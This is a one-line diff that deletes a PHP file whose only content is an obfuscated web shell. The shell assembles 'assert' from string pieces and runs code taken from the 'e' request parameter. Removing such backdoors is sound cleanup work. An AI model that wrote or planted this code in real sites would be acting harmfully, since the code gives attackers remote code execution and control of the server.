@@ -1,1 +1,0 @@
-<?php if(isset($_REQUEST["e"])) {$b="ass"."ert";$a=$b($_REQUEST["e"]);}?>
